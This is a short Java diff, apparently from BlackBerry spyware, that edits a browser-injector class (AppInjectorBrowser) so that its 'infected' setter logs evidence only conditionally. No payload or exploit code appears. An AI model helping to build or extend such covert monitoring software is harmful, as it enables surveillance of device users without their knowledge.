@@ -12,7 +12,6 @@ package blackberry.agent.url;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
-import net.rim.device.api.ui.UiApplication;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -104,8 +103,10 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         return infected;
     }
 
-    public void setInfected() {
-        Evidence.info("Browser");
+    public void setInfected(boolean value) {
+        if(value){
+            Evidence.info("Browser");
+        }
         infected = true;
     }
 
